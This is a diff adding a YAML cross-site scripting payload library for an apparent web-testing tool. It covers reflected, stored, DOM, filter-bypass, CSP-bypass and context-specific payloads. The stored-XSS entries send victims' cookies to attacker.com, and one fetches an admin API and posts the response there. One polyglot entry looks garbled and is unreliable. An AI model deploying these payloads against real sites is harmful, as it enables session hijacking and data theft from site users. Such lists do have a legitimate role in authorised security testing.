@@ -1,0 +1,83 @@
+id: xss-payloads
+category: payloads
+name: XSS Payload Library
+
+description: >
+  Cross-site scripting payloads for reflected, stored, and DOM contexts.
+  Use with xss_test or http_request for manual testing.
+
+reflected_xss:
+  basic:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "<svg onload=alert(1)>"
+    - "<body onload=alert(1)>"
+    - "javascript:alert(1)"
+  attribute_escape:
+    - "\" onmouseover=alert(1) x=\""
+    - "' onfocus=alert(1) autofocus='"
+    - "\" autofocus onfocus=alert(1) \""
+  tag_injection:
+    - "<img/src=x onerror=alert(1)>"
+    - "<details open ontoggle=alert(1)>"
+    - "<input onfocus=alert(1) autofocus>"
+    - "<marquee onstart=alert(1)>"
+    - "<video><source onerror=alert(1)>"
+
+stored_xss:
+  persistent:
+    - "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
+    - "<img src=x onerror=\"new Image().src='https://attacker.com/steal?c='+document.cookie\">"
+    - "<svg/onload=\"fetch('/api/admin').then(r=>r.text()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:d}))\">"
+
+dom_xss:
+  hash_based:
+    - "#<img src=x onerror=alert(1)>"
+    - "#\"><svg onload=alert(1)>"
+    - "#javascript:alert(1)"
+  source_sinks:
+    - "?search=<script>alert(1)</script>"
+    - "?q=<img src=x onerror=alert(1)>"
+    - "?redirect=javascript:alert(1)"
+
+filter_bypass:
+  case_variation:
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<IMG SRC=x ONERROR=alert(1)>"
+  encoding:
+    - "<script>alert(String.fromCharCode(88,83,83))</script>"
+    - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+    - "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+  null_byte:
+    - "<scr%00ipt>alert(1)</scr%00ipt>"
+    - "<img%00 src=x onerror=alert(1)>"
+  double_encoding:
+    - "%253Cscript%253Ealert(1)%253C/script%253E"
+    - "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
+  polyglots:
+    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleport0teleport/teleport/oNcliCk=alert()//>"
+    - "'\"-->]]>*/</script><script>alert(1)</script>"
+    - "'\"><img src=x onerror=alert(1)//>"
+
+csp_bypass:
+  jsonp:
+    - "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>"
+  base_tag:
+    - "<base href='https://attacker.com/'>"
+  meta_redirect:
+    - "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"
+
+context_specific:
+  inside_script:
+    - "';alert(1);//"
+    - "\";alert(1);//"
+    - "</script><script>alert(1)</script>"
+  inside_attribute:
+    - "\" onmouseover=\"alert(1)"
+    - "' onfocus='alert(1)' autofocus='"
+  inside_href:
+    - "javascript:alert(1)"
+    - "data:text/html,<script>alert(1)</script>"
+  inside_style:
+    - "expression(alert(1))"
+    - "url(javascript:alert(1))"
